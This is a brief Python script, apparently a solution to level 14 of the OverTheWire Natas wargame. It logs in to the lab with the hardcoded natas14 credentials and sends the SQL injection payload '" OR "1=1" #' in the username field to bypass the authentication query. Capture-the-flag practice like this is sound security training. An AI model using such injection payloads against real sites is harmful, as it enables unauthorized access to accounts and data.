import requests

user_name = "natas14"
password = "Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1"

url = f"http://{user_name}.natas.labs.overthewire.org"

session = requests.Session()


response = session.post(url, auth = (user_name, password), data={"username": '" OR "1=1" #'})

content = response.text


print(content)